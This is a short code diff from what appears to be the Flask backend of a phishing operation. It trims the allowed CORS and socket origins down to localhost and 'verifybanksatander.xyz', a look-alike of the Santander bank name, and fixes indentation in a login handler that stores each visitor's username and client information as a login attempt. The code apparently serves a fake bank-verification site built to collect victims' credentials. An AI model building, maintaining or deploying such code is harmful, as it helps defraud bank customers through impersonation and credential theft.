@@ -33,8 +33,7 @@ CORS(app, supports_credentials=True, resources={
         "origins": [
             "http://localhost:5173",
             "https://www.verifybanksatander.xyz",
-            "https://verifybanksatander.xyz",
-            "https://your-frontend-domain.com"
+            "https://verifybanksatander.xyz"
         ]
     }
 })
@@ -45,8 +44,7 @@ socketio = SocketIO(
     cors_allowed_origins=[
         "http://localhost:5173",
         "https://www.verifybanksatander.xyz",
-        "https://verifybanksatander.xyz",
-        "https://your-frontend-domain.com"
+        "https://verifybanksatander.xyz"
     ],
     manage_session=False,
     async_mode='eventlet',
@@ -216,7 +214,7 @@ def login():
             return jsonify({'message': 'Invalid admin credentials'}), 401
     else:
         client_info = get_client_info()
-    attempt_id = str(uuid.uuid4())
+        attempt_id = str(uuid.uuid4())
         new_attempt = LoginAttempt(
             id=attempt_id,
             username=username,
